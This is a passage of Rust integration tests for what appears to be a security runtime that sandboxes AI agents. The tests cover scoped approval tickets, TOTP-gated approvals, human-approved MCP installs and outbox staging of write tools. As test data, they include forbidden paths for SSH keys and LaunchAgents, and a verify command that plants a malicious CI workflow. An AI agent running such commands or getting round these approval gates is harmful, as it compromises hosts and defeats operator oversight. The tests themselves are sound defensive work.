                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();
        kernel
            .call_tool(
                &AgentIdentity::new("org-a", "coder-a", "Engineer"),
                "fs_write",
                json!({ "path": "note.txt", "content": "hello\n" }),
            )
            .await
            .unwrap();
        let ask_a = kernel
            .call_tool(
                &AgentIdentity::new("org-a", "coder-a", "Engineer"),
                "workspace_commit",
                json!({}),
            )
            .await
            .unwrap();
        let esc_a = ask_a["escalation_id"].as_str().unwrap().to_string();
        let ticket_a = ask_a["approval_ticket"].as_str().unwrap().to_string();
        assert!(ticket_a.starts_with("ast_"), "{ask_a}");

        let (_, sim_b) = raw_http(
            addr,
            "POST",
            "/v1/approvals/simulate",
            Some(&op),
            Some(json!({ "org_id": "org-b", "agent_id": "coder-b" })),
        )
        .await;
        let esc_b = sim_b["escalation_id"].as_str().unwrap().to_string();

        // Scoped ticket sees ONLY esc_a in /v1/status, never esc_b or keys/workspaces
        let (st_head, st_body) = raw_http(addr, "GET", "/v1/status", Some(&ticket_a), None).await;
        assert!(st_head.contains("200 OK"), "{st_head}: {st_body}");
        assert_eq!(st_body["pending_escalations"].as_array().unwrap().len(), 1);
        assert_eq!(st_body["pending_escalations"][0]["escalation_id"], esc_a);
        assert_eq!(st_body["api_keys"].as_array().unwrap().len(), 0);

        // Scoped ticket cannot access esc_b, other orgs, workspaces, or lease revocation
        let (diff_b_head, _) = raw_http(
            addr,
            "GET",
            &format!("/v1/approvals/diff?escalation_id={esc_b}"),
            Some(&ticket_a),
            None,
        )
        .await;
        assert!(diff_b_head.contains("403 Forbidden"), "{diff_b_head}");
        let (rev_head, _) = raw_http(
            addr,
            "POST",
            "/v1/leases/revoke",
            Some(&ticket_a),
            Some(json!({ "lease_id": "lease-1" })),
        )
        .await;
        assert!(rev_head.contains("403 Forbidden"), "{rev_head}");

        // Scoped ticket can approve esc_a ONLY with valid 6-digit TOTP
        let (bad_dec, _) = raw_http(
            addr,
            "POST",
            "/v1/approvals/decide",
            Some(&ticket_a),
            Some(json!({ "escalation_id": esc_a, "decision": "approve", "totp": "000000" })),
        )
        .await;
        assert!(bad_dec.contains("403 Forbidden"), "{bad_dec}");
        let code = code_for(&secret_hex, 0);
        let (ok_dec, ok_body) = raw_http(
            addr,
            "POST",
            "/v1/approvals/decide",
            Some(&ticket_a),
            Some(json!({ "escalation_id": esc_a, "decision": "approve", "totp": code })),
        )
        .await;
        assert!(ok_dec.contains("200 OK"), "{ok_dec}: {ok_body}");
        assert_eq!(ok_body["status"], "approved");
    }

    #[tokio::test]
    async fn test_export_case_folding_and_post_verify_commit_poisoning_toctou() {
        assert!(is_forbidden_export_dest("/tmp/user/.SSH/id_rsa", "/tmp/user/.SSH/id_rsa"));
        assert!(is_forbidden_export_dest(
            "/Library/launchagents/evil.plist",
            "/Library/launchagents/evil.plist"
        ));

        let temp = tempfile::tempdir().unwrap();
        let host_repo = temp.path().join("host_repo");
        tokio::fs::create_dir_all(&host_repo).await.unwrap();
        tokio::fs::write(host_repo.join("main.rs"), "fn main() {}\n")
            .await
            .unwrap();
        let kernel = AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap();
        let agent = AgentIdentity::new("toctou-org", "coder", "Engineer");
        kernel
            .ensure_agent_environment(
                agent.clone(),
                &host_repo,
                IsolationTier::NativeOsSandbox,
                vec!["*".to_string()],
            )
            .await
            .unwrap();
        kernel
            .call_tool(
                &agent,
                "policy_grant_lease",
                json!({ "action": "workspace_commit", "resource": "*", "ttl_secs": 3600 }),
            )
            .await
            .unwrap();
        kernel
            .call_tool(
                &agent,
                "fs_write",
                json!({ "path": "main.rs", "content": "fn main() { println!(\"ok\"); }\n" }),
            )
            .await
            .unwrap();

        // A verify_cmd that attempts to drop a sensitive CI workflow file after pre-commit policy check
        // must be blocked by the post-verify frozen TOCTOU guard before touching host_repo.
        let err = kernel
            .call_tool(
                &agent,
                "workspace_commit",
                json!({ "verify_cmd": "mkdir -p .github/workflows && echo 'name: evil' > .github/workflows/evil.yml" }),
            )
            .await
            .unwrap_err()
            .to_string();
        assert!(err.contains("TOCTOU guard") || err.contains("sensitive path"), "{err}");
        assert!(!host_repo.join(".github/workflows/evil.yml").exists());
    }

    #[tokio::test]
    async fn test_gateway_tool_profile_minimal_rejects_unlisted_tools_and_resources() {
        let temp = tempfile::tempdir().unwrap();
        let kernel = AegisRuntimeKernel::new(&temp.path().join("rt")).await.unwrap();
        let agent = AgentIdentity::new("prof-org", "agent-min", "Engineer");

        let denied_tool = kernel
            .handle_jsonrpc_message_with_profile(
                &agent,
                json!({
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "tools/call",
                    "params": { "name": "ipc_send", "arguments": {} }
                }),
                GatewayToolProfile::Minimal,
            )
            .await
            .unwrap();
        assert_eq!(denied_tool["error"]["code"], -32601);

        let denied_res = kernel
            .handle_jsonrpc_message_with_profile(
                &agent,
                json!({
                    "jsonrpc": "2.0",
                    "id": 2,
                    "method": "resources/read",
                    "params": { "uri": "aegis://ipc/inbox" }
                }),
                GatewayToolProfile::Minimal,
            )
            .await
            .unwrap();
        assert_eq!(denied_res["error"]["code"], -32601);
    }

    #[tokio::test]
    async fn option_b_external_mcp_discover_approve_inline_vault_and_hot_bridge_e2e() {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        use tokio::net::TcpListener;

        // 1. Spawn mock external Streamable HTTP MCP server requiring Bearer auth and exposing read+write tools.
        let seen_auth = Arc::new(tokio::sync::Mutex::new(Vec::<String>::new()));
        let seen_auth_srv = seen_auth.clone();
        let mcp_listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let mcp_addr = mcp_listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let Ok((mut stream, _)) = mcp_listener.accept().await else {
                    break;
                };
                let seen_auth = seen_auth_srv.clone();
                tokio::spawn(async move {
                    let mut buf = Vec::new();
                    let mut tmp = [0u8; 4096];
                    loop {
                        let n = stream.read(&mut tmp).await.unwrap_or(0);
                        if n == 0 {
                            break;
                        }
                        buf.extend_from_slice(&tmp[..n]);
                        let raw = String::from_utf8_lossy(&buf);
                        if let Some((head, body)) = raw.split_once("\r\n\r\n") {
                            let clen: usize = head
                                .lines()
                                .find_map(|l| {
                                    let (k, v) = l.split_once(':')?;
                                    k.eq_ignore_ascii_case("content-length")
                                        .then(|| v.trim().parse().ok())?
                                })
                                .unwrap_or(0);
                            if body.len() >= clen {
                                let auth_hdr = head
                                    .lines()
                                    .find_map(|l| {
                                        let (k, v) = l.split_once(':')?;
                                        k.eq_ignore_ascii_case("authorization")
                                            .then(|| v.trim().to_string())
                                    })
                                    .unwrap_or_default();
                                seen_auth.lock().await.push(auth_hdr.clone());

                                if auth_hdr != "Bearer lin_secret_tok_999" {
                                    let resp = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Bearer\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
                                    let _ = stream.write_all(resp.as_bytes()).await;
                                    return;
                                }

                                let req: Value = serde_json::from_str(&body[..clen]).unwrap_or_default();
                                let rid = req.get("id").cloned().unwrap_or(json!(1));
                                let method = req.get("method").and_then(|v| v.as_str()).unwrap_or("");
                                let resp_json = match method {
                                    "initialize" => json!({
                                        "jsonrpc": "2.0",
                                        "id": rid,
                                        "result": {
                                            "protocolVersion": "2024-11-05",
                                            "serverInfo": { "name": "mock-linear", "version": "1.0.0" },
                                            "capabilities": { "tools": {} }
                                        }
                                    }),
                                    "tools/list" => json!({
                                        "jsonrpc": "2.0",
                                        "id": rid,
                                        "result": {
                                            "tools": [
                                                {
                                                    "name": "list_issues",
                                                    "description": "List open bugs",
                                                    "inputSchema": { "type": "object", "properties": {} },
                                                    "annotations": { "readOnlyHint": true }
                                                },
                                                {
                                                    "name": "create_issue",
                                                    "description": "Create issue",
                                                    "inputSchema": { "type": "object", "properties": {} },
                                                    "annotations": { "readOnlyHint": false }
                                                }
                                            ]
                                        }
                                    }),
                                    "tools/call" => json!({
                                        "jsonrpc": "2.0",
                                        "id": rid,
                                        "result": {
                                            "content": [{
                                                "type": "text",
                                                "text": "Bug #42 reported by alice@heurion.io"
                                            }]
                                        }
                                    }),
                                    _ => json!({ "jsonrpc": "2.0", "id": rid, "result": {} }),
                                };
                                let s = resp_json.to_string();
                                let out = format!(
                                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nMcp-Session-Id: ses-mock-lin\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{s}",
                                    s.len()
                                );
                                let _ = stream.write_all(out.as_bytes()).await;
                                return;
                            }
                        }
                    }
                });
            }
        });

        // 2. Spawn mock Official MCP Registry `/v0.1/servers` pointing to our mock HTTP MCP server.
        let reg_listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let reg_addr = reg_listener.local_addr().unwrap();
        let reg_payload = json!({
            "servers": [{
                "server": {
                    "name": "app.linear/mcp",
                    "title": "Linear Mock MCP",
                    "description": "Issue tracker",
                    "version": "1.0.0",
                    "remotes": [{
                        "type": "streamable-http",
                        "url": format!("http://{mcp_addr}/mcp"),
                        "headers": [{ "name": "Authorization", "isSecret": true, "isRequired": true }]
                    }]
                }
            }]
        })
        .to_string();
        tokio::spawn(async move {
            loop {
                let Ok((mut stream, _)) = reg_listener.accept().await else {
                    break;
                };
                let body = reg_payload.clone();
                tokio::spawn(async move {
                    let mut buf = [0u8; 2048];
                    let _ = stream.read(&mut buf).await;
                    let out = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = stream.write_all(out.as_bytes()).await;
                });
            }
        });

        // 3. Boot AegisRuntimeKernel + local Web Approval Console.
        let temp = tempfile::tempdir().unwrap();
        let rt_dir = temp.path().join("rt");
        let repo = temp.path().join("repo");
        std::fs::create_dir_all(&rt_dir).unwrap();
        std::fs::create_dir_all(&repo).unwrap();
        std::fs::write(
            rt_dir.join("mcp_registries.json"),
            serde_json::to_vec(&vec![format!("http://{reg_addr}")]).unwrap(),
        )
        .unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&rt_dir).await.unwrap());
        kernel.set_allow_agent_local_http(true);
        let addr = kernel.clone().start_http_daemon("127.0.0.1:0", repo).await.unwrap();
        let op = kernel.operator_token();
        let agent = AgentIdentity::new("acme", "coder-optb", "Engineer");

        // 4. `mcp_hot_*` must FAIL CLOSED before approval.
        assert!(kernel
            .call_tool(&agent, "mcp_hot_list_tools", json!({ "server_id": "linear" }))
            .await
            .is_err());

        // 5. `aegis://mcp/installed` & `mcp_discover` succeed read-only.
        let inv_res = kernel
            .handle_jsonrpc_message(
                &agent,
                json!({ "jsonrpc": "2.0", "id": 10, "method": "resources/read", "params": { "uri": "aegis://mcp/installed" } }),
            )
            .await
            .unwrap();
        assert!(inv_res["result"]["contents"][0]["text"].as_str().unwrap().contains("\"servers\""));

        let disc = kernel
            .call_tool(
                &agent,
                "mcp_discover",
                json!({ "query": "linear", "allow_local_http": true }),
            )
            .await
            .unwrap();
        assert_eq!(disc["candidates"][0]["server_id"], "linear");

        // 6. Agent calls `mcp_request_install` -> Escalates for human approval!
        let ask = kernel
            .call_tool(
                &agent,
                "mcp_request_install",
                json!({
                    "target": format!("http://{mcp_addr}/mcp"),
                    "server_id": "linear",
                    "reason": "Need Linear issues",
                    "allow_local_http": true
                }),
            )
            .await
            .unwrap();
        assert_eq!(ask["status"], "approval_required");
        let esc_id = ask["escalation_id"].as_str().unwrap().to_string();

        // Anonymous approval MUST be rejected (403).
        let (anon_head, _) = raw_http(
            addr,
            "POST",
            "/v1/approvals/decide",
            None,
            Some(json!({ "escalation_id": esc_id, "inline_auth_token": "evil" })),
        )
        .await;
        assert!(anon_head.contains("403"), "anonymous approval must fail: {anon_head}");

        // 7. Operator approves with inline static token on Host Web Console.
        let (ok_head, _) = raw_http(
            addr,
            "POST",
            "/v1/approvals/decide",
            Some(&op),
            Some(json!({
                "escalation_id": esc_id,
                "decision": "approve",
                "ttl_secs": 0,
                "inline_auth_token": "lin_secret_tok_999",
                "trust_override": "untrusted"
            })),
        )
        .await;
        assert!(ok_head.contains("200 OK"), "{ok_head}");

        // 8. Retrying `mcp_request_install` succeeds and enables Option B Hot-Bridge!
        let installed = kernel
            .call_tool(
                &agent,
                "mcp_request_install",
                json!({
                    "target": format!("http://{mcp_addr}/mcp"),
                    "server_id": "linear",
                    "reason": "Need Linear issues",
                    "allow_local_http": true
                }),
            )
            .await
            .unwrap();
        assert_eq!(installed["status"], "installed");
        assert_eq!(installed["mode"], "ready_via_hot_bridge");
        assert_eq!(installed["auth_state"], "valid");

        // 9. Hot-bridge now lists tools & calls read tool (injecting Vault token + PII pseudonymization + taint!).
        let tools_res = kernel
            .call_tool(&agent, "mcp_hot_list_tools", json!({ "server_id": "linear" }))
            .await
            .unwrap();
        assert_eq!(tools_res["bridge_mode"], "option_b_hot_session_bridge");
        assert_eq!(tools_res["result"]["tools"].as_array().unwrap().len(), 2);

        let call_res = kernel
            .call_tool(
                &agent,
                "mcp_hot_call_tool",
                json!({ "server_id": "linear", "tool_name": "list_issues", "arguments": {} }),
            )
            .await
            .unwrap();
        let text = call_res["result"]["content"][0]["text"].as_str().unwrap();
        assert!(!text.contains("alice@heurion.io"), "PII must be pseudonymized: {text}");
        assert!(seen_auth.lock().await.iter().any(|h| h == "Bearer lin_secret_tok_999"));

        // Write tool on untrusted MCP must be staged into Outbox, never directly executed!
        let write_res = kernel
            .call_tool(
                &agent,
                "mcp_hot_call_tool",
                json!({ "server_id": "linear", "tool_name": "create_issue", "arguments": { "title": "x" } }),
            )
            .await
            .unwrap();
        let write_text = write_res["result"]["content"][0]["text"].as_str().unwrap();
        assert!(write_text.contains("staged_for_human_approval"), "write must stage to Outbox: {write_text}");

        // 10. Verify `/v1/mcp/inventory` requires operator auth & hides secret token.
        let (inv_unauth, _) = raw_http(addr, "GET", "/v1/mcp/inventory?org_id=acme", None, None).await;
        assert!(inv_unauth.contains("401") || inv_unauth.contains("403"));
        let (inv_ok, inv_body) =
            raw_http(addr, "GET", "/v1/mcp/inventory?org_id=acme", Some(&op), None).await;
        assert!(inv_ok.contains("200 OK"));
        let inv_str = inv_body.to_string();
        assert!(!inv_str.contains("lin_secret_tok_999"));
        assert!(inv_str.contains("linear"));
    }

    #[tokio::test]
    async fn web_console_mcp_oauth_pkce_policy_token_and_outbox_e2e() {
        let seen_dispatches = Arc::new(tokio::sync::Mutex::new(Vec::<(String, String, Value)>::new()));
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let mock_addr = listener.local_addr().unwrap();
        let auth_base = format!("http://{mock_addr}");
        let dispatches_srv = seen_dispatches.clone();

        tokio::spawn(async move {
            loop {
                let Ok((mut stream, _)) = listener.accept().await else {
                    break;
                };
                let auth_base = auth_base.clone();
                let dispatches_srv = dispatches_srv.clone();
                tokio::spawn(async move {
                    let mut raw = Vec::new();
                    let mut tmp_buf = [0u8; 4096];
                    let mut hdr_end = None;
                    let mut clen = 0usize;
                    loop {
                        let Ok(n) = tokio::io::AsyncReadExt::read(&mut stream, &mut tmp_buf).await else {
                            return;
                        };
                        if n == 0 {
                            break;
                        }
                        raw.extend_from_slice(&tmp_buf[..n]);
                        if hdr_end.is_none() {
                            if let Some(pos) = raw.windows(4).position(|w| w == b"\r\n\r\n") {
                                hdr_end = Some(pos + 4);
                                let head = String::from_utf8_lossy(&raw[..pos]);
                                for line in head.lines() {
                                    if let Some((k, v)) = line.split_once(':') {
                                        if k.eq_ignore_ascii_case("content-length") {
                                            clen = v.trim().parse().unwrap_or(0);
                                        }
                                    }
                                }
                            }
                        }
                        if let Some(he) = hdr_end {
                            if raw.len() >= he + clen {
                                break;
                            }
                        }
                    }
                    let he = hdr_end.unwrap_or(raw.len());
                    let head = String::from_utf8_lossy(&raw[..he]).to_string();
                    let body_end = (he + clen).min(raw.len());
                    let body = String::from_utf8_lossy(&raw[he..body_end]).to_string();
                    let target = head
                        .lines()
                        .next()
                        .and_then(|l| l.split_whitespace().nth(1))
                        .unwrap_or("/");
                    let auth_hdr = head
                        .lines()
                        .find_map(|l| {
                            l.split_once(':').and_then(|(k, v)| {
                                k.eq_ignore_ascii_case("authorization")
                                    .then(|| v.trim().to_string())
                            })
                        })
                        .unwrap_or_default();

                    let (status_line, json_body) = match target {
                        "/.well-known/oauth-authorization-server" => (
                            "200 OK",
                            json!({
                                "issuer": auth_base,
                                "authorization_endpoint": format!("{auth_base}/authorize"),
                                "token_endpoint": format!("{auth_base}/token"),
                                "device_authorization_endpoint": format!("{auth_base}/device"),
                                "registration_endpoint": format!("{auth_base}/register"),
                                "scopes_supported": ["mcp:read", "mcp:write"]
                            }),
                        ),
                        "/register" => (
                            "201 Created",
                            json!({
                                "client_id": "dyn-web-client-1",
                                "token_endpoint_auth_method": "none"
                            }),
                        ),
                        "/token" => {
                            assert!(body.contains("grant_type=authorization_code"));
                            assert!(body.contains("code=pkce-web-code"));
                            (
                                "200 OK",
                                json!({
                                    "access_token": "tok_web_pkce_999",
                                    "refresh_token": "rt_web_999",
                                    "token_type": "Bearer",
                                    "expires_in": 3600
                                }),
                            )
                        }
                        "/mcp" => {
                            if auth_hdr != "Bearer tok_web_pkce_999"
                                && auth_hdr != "Bearer tok_static_web_777"
                            {
                                let unauth = "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Bearer\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
                                let _ = tokio::io::AsyncWriteExt::write_all(&mut stream, unauth.as_bytes()).await;
                                return;
                            }
                            let req: Value = serde_json::from_str(&body).unwrap_or_default();
                            let rid = req.get("id").cloned().unwrap_or(json!(1));
                            let rpc_method = req.get("method").and_then(|v| v.as_str()).unwrap_or("");
                            let resp = match rpc_method {
                                "initialize" => json!({
                                    "jsonrpc": "2.0",
                                    "id": rid,
                                    "result": {
                                        "protocolVersion": "2024-11-05",
                                        "serverInfo": { "name": "mock-notion", "version": "1.0.0" },
                                        "capabilities": { "tools": {} }
                                    }
                                }),
                                "tools/call" => {
                                    let tname = req["params"]["name"].as_str().unwrap_or("").to_string();
                                    let targs = req["params"]["arguments"].clone();
                                    dispatches_srv.lock().await.push((auth_hdr, tname.clone(), targs));
                                    json!({
                                        "jsonrpc": "2.0",
                                        "id": rid,
                                        "result": {
                                            "content": [{ "type": "text", "text": format!("dispatched:{tname}") }]
                                        }
                                    })
                                }
                                _ => json!({ "jsonrpc": "2.0", "id": rid, "result": { "tools": [] } }),
                            };
                            ("200 OK", resp)
                        }
                        _ => ("404 Not Found", json!({ "error": "not found" })),
                    };

                    let s = json_body.to_string();
                    let out = format!(
                        "HTTP/1.1 {status_line}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{s}",
                        s.len()
                    );
                    let _ = tokio::io::AsyncWriteExt::write_all(&mut stream, out.as_bytes()).await;
                });
            }
        });

        let temp = tempfile::tempdir().unwrap();
        let rt_dir = temp.path().join("rt");
        let repo = temp.path().join("repo");
        std::fs::create_dir_all(&rt_dir).unwrap();
        std::fs::create_dir_all(&repo).unwrap();

        let kernel = Arc::new(AegisRuntimeKernel::new(&rt_dir).await.unwrap());
        kernel.set_allow_agent_local_http(true);
        let addr = kernel.clone().start_http_daemon("127.0.0.1:0", repo).await.unwrap();
        let op = kernel.operator_token();
        let (tenant_key, _) = kernel
            .paas
            .issue_api_key("acme", "coder-web", "Engineer", None, "test-web")
            .await
            .unwrap();

        kernel
            .mcp_firewall
            .register_http_server_with_options(
                "acme",
                "notion",
                &format!("http://{mock_addr}/mcp"),
                BTreeMap::new(),
                McpServerPolicy::default(),
                Some("notion"),
                None,
                true,
            )
            .await
            .unwrap();

        // 1. Tenant API key MUST receive 403 on all `/v1/mcp/*` operator admin routes.
        for (m, p, b) in [
            ("GET", "/v1/mcp/inventory?org_id=acme", None),
            ("POST", "/v1/mcp/logout", Some(json!({ "org_id": "acme", "realm_id": "notion" }))),
            ("POST", "/v1/mcp/oauth/start", Some(json!({ "org_id": "acme", "server_id": "notion" }))),
            ("GET", "/v1/mcp/oauth/status?session_id=oauth-x", None),
            ("POST", "/v1/mcp/login-token", Some(json!({ "org_id": "acme", "server_id": "notion", "token": "bad" }))),
            ("POST", "/v1/mcp/policy", Some(json!({ "org_id": "acme", "server_id": "notion", "trust_level": "trusted" }))),
            ("GET", "/v1/mcp/outbox?org_id=acme", None),
            ("POST", "/v1/mcp/outbox/decide", Some(json!({ "org_id": "acme", "ticket_id": "outbox-x", "approve": true }))),
        ] {
            let (h, _) = raw_http(addr, m, p, Some(&tenant_key), b).await;
            assert!(h.contains("403"), "tenant key must be blocked on {m} {p}: {h}");
        }

        // 2. Verify `/approve` Web Console UI renders new OAuth, Policy, and Outbox hooks.
        let (html_head, html_body) = raw_http(addr, "GET", "/approve?mode=local", None, None).await;
        assert!(html_head.contains("200 OK"), "{html_head}");
        let html = html_body["html"].as_str().unwrap_or("");
        for needle in [
            "/v1/mcp/oauth/start",
            "/v1/mcp/policy",
            "/v1/mcp/login-token",
            "/v1/mcp/outbox/decide",
            "safeAuthUrl",
            "mcp-outbox-card",
        ] {
            assert!(html.contains(needle), "/approve HTML missing {needle}");
        }

        // 3. Start async PKCE OAuth flow from Web Console route and complete callback.
        let (oauth_head, oauth_start) = raw_http(
            addr,
            "POST",
            "/v1/mcp/oauth/start",
            Some(&op),
            Some(json!({
                "org_id": "acme",
                "server_id": "notion",
                "mode": "auto",
                "allow_local_http": true
            })),
        )
        .await;
        assert!(oauth_head.contains("200 OK"), "{oauth_head} {oauth_start}");
        assert_eq!(oauth_start["flow"], "pkce");
        let sess_id = oauth_start["session_id"].as_str().unwrap().to_string();
        let auth_url = oauth_start["authorize_url"].as_str().unwrap().to_string();

        fn pct_decode(raw: &str) -> String {
            let mut out = String::with_capacity(raw.len());
            let bytes = raw.as_bytes();
            let mut i = 0usize;
            while i < bytes.len() {
                if bytes[i] == b'%' && i + 2 < bytes.len() {
                    if let Ok(hex_s) = std::str::from_utf8(&bytes[i + 1..i + 3]) {
                        if let Ok(b) = u8::from_str_radix(hex_s, 16) {
                            out.push(b as char);
                            i += 3;
                            continue;
                        }
                    }
                } else if bytes[i] == b'+' {
                    out.push(' ');
                    i += 1;
                    continue;
                }
                out.push(bytes[i] as char);
                i += 1;
            }
            out
        }
        let query = auth_url.split_once('?').unwrap().1;
        let mut redirect_uri = String::new();
        let mut oauth_state = String::new();
        for pair in query.split('&') {
            if let Some((k, v)) = pair.split_once('=') {
                if k == "redirect_uri" {
                    redirect_uri = pct_decode(v);
                } else if k == "state" {
                    oauth_state = pct_decode(v);
                }
            }
        }
        let cb_url = format!("{redirect_uri}?code=pkce-web-code&state={oauth_state}");
        let (cb_status, _, _) =
            mcp_http::simple_http_request("GET", &cb_url, &[], None, true, 5000)
                .await
                .unwrap();
        assert_eq!(cb_status, 200);

        let mut completed = false;
        for _ in 0..40 {
            let (_, st_json) = raw_http(
                addr,
                "GET",
                &format!("/v1/mcp/oauth/status?session_id={sess_id}"),
                Some(&op),
                None,
            )
            .await;
            if st_json["status"] == "completed" {
                completed = true;
                break;
            }
            tokio::time::sleep(std::time::Duration::from_millis(25)).await;
        }
        assert!(completed, "Web OAuth PKCE session did not complete in time");

        let (_, inv_json) = raw_http(addr, "GET", "/v1/mcp/inventory?org_id=acme", Some(&op), None).await;
        assert!(!inv_json.to_string().contains("tok_web_pkce_999"));
        let notion = inv_json["servers"]
            .as_array()
            .unwrap()
            .iter()
            .find(|s| s["server_id"] == "notion")
            .unwrap();
        assert_eq!(notion["auth_state"], "valid");

        // 4. Static token login + granular policy update via `/v1/mcp/login-token` and `/v1/mcp/policy`.
        let (tok_head, tok_res) = raw_http(
            addr,
            "POST",
            "/v1/mcp/login-token",
            Some(&op),
            Some(json!({
                "org_id": "acme",
                "server_id": "notion",
                "token": "tok_static_web_777"
            })),
        )
        .await;
        assert!(tok_head.contains("200 OK"), "{tok_head} {tok_res}");
        assert!(!tok_res.to_string().contains("tok_static_web_777"));

        let (pol_head, pol_res) = raw_http(
            addr,
            "POST",
            "/v1/mcp/policy",
            Some(&op),
            Some(json!({
                "org_id": "acme",
                "server_id": "notion",
                "trust_level": "trusted_internal",
                "dlp_mode": "block",
                "allow_tools": ["list_items"],
                "forbid_tools": ["nuke_all"]
            })),
        )
        .await;
        assert!(pol_head.contains("200 OK"), "{pol_head} {pol_res}");
        assert_eq!(pol_res["server"]["policy"]["trust_level"], "trusted_internal");
        assert_eq!(pol_res["server"]["policy"]["dlp_mode"], "block");
        assert_eq!(pol_res["server"]["policy"]["tool_overrides"]["list_items"], "read_only");
        assert_eq!(pol_res["server"]["policy"]["tool_overrides"]["nuke_all"], "forbidden");

        // Reset to untrusted + inspect & dispatch Outbox ticket via `/v1/mcp/outbox` + `/v1/mcp/outbox/decide`.
        let _ = raw_http(
            addr,
            "POST",
            "/v1/mcp/policy",
            Some(&op),
            Some(json!({
                "org_id": "acme",
                "server_id": "notion",
                "trust_level": "untrusted_external"
            })),
        )
        .await;

        let agent = AgentIdentity::new("acme", "coder-web", "Engineer");
        let staged = kernel
            .mcp_firewall
            .stage_outbox_ticket(
                &agent,
                "ses-web-1",
                "notion",
                "create_item",
                McpToolRiskClass::StagedWrite,
                json!({ "title": "demo" }),
                json!({ "title": "demo" }),
                None,
                false,
            )
            .await
            .unwrap();

        let (ob_head, ob_json) = raw_http(
            addr,
            "GET",
            "/v1/mcp/outbox?org_id=acme&status=pending",
            Some(&op),
            None,
        )
        .await;
        assert!(ob_head.contains("200 OK"), "{ob_head}");
        assert!(!ob_json.to_string().contains("sealed_exec_arguments"));
        assert_eq!(ob_json["tickets"][0]["ticket_id"], staged.ticket_id);

        let (dec_head, dec_json) = raw_http(
            addr,
            "POST",
            "/v1/mcp/outbox/decide",
            Some(&op),
            Some(json!({
                "org_id": "acme",
                "ticket_id": staged.ticket_id,
                "approve": true
            })),
        )
        .await;
        assert!(dec_head.contains("200 OK"), "{dec_head} {dec_json}");
        assert!(!dec_json.to_string().contains("sealed_exec_arguments"));
        assert_eq!(dec_json["ticket"]["status"], "dispatched");
        let dispatches = seen_dispatches.lock().await;
        assert_eq!(dispatches.len(), 1);
        assert_eq!(dispatches[0].0, "Bearer tok_static_web_777");
        assert_eq!(dispatches[0].1, "create_item");
    }

    #[tokio::test]
    async fn option_b_install_and_hot_bridge_emit_list_changed_notifications() {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};

        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let mcp_addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let Ok((mut stream, _)) = listener.accept().await else {
                    break;
                };
                tokio::spawn(async move {
                    let mut buf = Vec::new();
                    let mut tmp = [0u8; 4096];
                    loop {
                        let n = stream.read(&mut tmp).await.unwrap_or(0);
                        if n == 0 {
                            break;
                        }
                        buf.extend_from_slice(&tmp[..n]);
                        let raw = String::from_utf8_lossy(&buf);
                        if let Some((head, body)) = raw.split_once("\r\n\r\n") {
                            let clen: usize = head
                                .lines()
                                .find_map(|l| {
                                    let (k, v) = l.split_once(':')?;
                                    k.eq_ignore_ascii_case("content-length")
                                        .then(|| v.trim().parse().ok())?
                                })
                                .unwrap_or(0);
                            if body.len() >= clen {
                                let req: Value =
                                    serde_json::from_str(&body[..clen]).unwrap_or_default();
                                let rid = req.get("id").cloned().unwrap_or(json!(1));
                                let method = req.get("method").and_then(|v| v.as_str()).unwrap_or("");
                                if method == "notifications/initialized" {
                                    let _ = stream
                                        .write_all(b"HTTP/1.1 202 Accepted\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
                                        .await;
                                    return;
                                }
                                if method == "tools/list" {
                                    let sse = format!(
                                        "data: {}\n\ndata: {}\n\n",
                                        json!({ "jsonrpc": "2.0", "method": "notifications/tools/list_changed" }),
                                        json!({
                                            "jsonrpc": "2.0",
                                            "id": rid,
                                            "result": {
                                                "tools": [{
                                                    "name": "list_issues",
                                                    "description": "Read issues",
                                                    "inputSchema": { "type": "object", "properties": {} },
                                                    "annotations": { "readOnlyHint": true }
                                                }]
                                            }
                                        })
                                    );
                                    let out = format!(
                                        "HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nMcp-Session-Id: ses-p3-optb\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                                        sse.len(),
                                        sse
                                    );
                                    let _ = stream.write_all(out.as_bytes()).await;
                                    return;
                                }
                                if method == "tools/call" {
                                    let sse = format!(
                                        "data: {}\n\ndata: {}\n\n",
                                        json!({ "jsonrpc": "2.0", "method": "notifications/resources/list_changed" }),
                                        json!({
                                            "jsonrpc": "2.0",
                                            "id": rid,
                                            "result": {
                                                "content": [{ "type": "text", "text": "issue-101" }]
                                            }
                                        })
                                    );
                                    let out = format!(
                                        "HTTP/1.1 200 OK\r\nContent-Type: text/event-stream\r\nMcp-Session-Id: ses-p3-optb\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                                        sse.len(),
                                        sse
                                    );
                                    let _ = stream.write_all(out.as_bytes()).await;
                                    return;
                                }
                                let init_body = json!({
                                    "jsonrpc": "2.0",
                                    "id": rid,
                                    "result": {
                                        "protocolVersion": "2024-11-05",
                                        "serverInfo": { "name": "mock-optb-push", "version": "1.0.0" },
                                        "capabilities": { "tools": { "listChanged": true } }
                                    }
                                })
                                .to_string();
                                let out = format!(
                                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nMcp-Session-Id: ses-p3-optb\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                                    init_body.len(),
                                    init_body
                                );
                                let _ = stream.write_all(out.as_bytes()).await;
                                return;
